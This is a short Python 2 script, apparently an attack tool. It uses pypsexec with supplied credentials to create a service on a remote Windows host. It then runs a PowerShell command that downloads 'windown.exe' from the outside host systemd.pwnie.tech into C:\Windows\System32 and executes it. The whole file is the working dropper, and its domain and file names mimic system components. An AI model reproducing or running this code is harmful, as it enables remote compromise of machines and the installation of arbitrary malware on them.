from pypsexec.client import Client
import sys

def main():
    if len(sys.argv) != 4:
        print "pysexec <hostname or IP> <username> <password>"
        exit(1)
    hostname = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]    
    c = Client(hostname, username=username, password=password)
    c.connect()
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("cmd.exe", arguments='/c powershell.exe "$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile(\\\"http://systemd.pwnie.tech/windown.exe\\\",\\\"C:\\Windows\\System32\\windown.exe\\\"); C:\\Windows\\System32\\windown.exe"')
        print stdout, stderr, rc
    except:
        print "fuck"
        pass
    finally:
        c.remove_service()
    c.disconnect()

if __name__ == '__main__':
    main()
